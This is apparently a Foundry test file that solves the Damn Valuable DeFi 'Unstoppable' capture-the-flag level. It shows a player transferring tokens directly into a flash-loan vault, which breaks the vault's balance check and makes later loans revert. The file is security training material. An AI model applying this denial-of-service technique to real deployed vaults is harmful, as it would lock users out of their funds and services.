// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import "../../contracts/unstoppable/ReceiverUnstoppable.sol";
import "../../contracts/unstoppable/UnstoppableVault.sol";

import "../../contracts/DamnValuableToken.sol";

error InvalidBalance();

contract UnstoppableChallenge is Test {

    address deployer = vm.addr(1);
    address player = vm.addr(2);
    address someUser = address(1);

    DamnValuableToken public DVT;
    UnstoppableVault public vault;
    ReceiverUnstoppable public receiverContract;

    uint256 constant TOKENS_IN_VAULT = 1000000 * 10 ** 18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 * 10 ** 18;

    function setUp() external {

        vm.startPrank(deployer);
        DVT = new DamnValuableToken();
        vault = new UnstoppableVault(DVT, deployer, deployer);
        vm.stopPrank();

    }

    function testPreAttack() public {

        vm.startPrank(deployer);
        assertTrue(vault.asset() == DVT);
        DVT.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        assertEq(DVT.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(DVT)), TOKENS_IN_VAULT);

        assertEq(vault.flashFee(address(DVT), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(DVT), TOKENS_IN_VAULT), 50000 * 10 ** 18);

        DVT.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        assertTrue(DVT.balanceOf(player) == INITIAL_PLAYER_TOKEN_BALANCE);
        vm.stopPrank();

        vm.startPrank(someUser);
        // Show it's possible for someUser to take out a flash loan
        receiverContract = new ReceiverUnstoppable(address(vault));
        receiverContract.executeFlashLoan(100 * 10 ** 18);

        vm.stopPrank();
    }

    function testAttack() external {

        console.log("Attack Initiation");

        testPreAttack();
        assertEq(DVT.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
        vm.startPrank(player);
        DVT.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE/10);
        vm.stopPrank();

        vm.startPrank(someUser);
        vm.expectRevert(InvalidBalance.selector);
        receiverContract.executeFlashLoan(100 * 10 ** 18);
    }

}





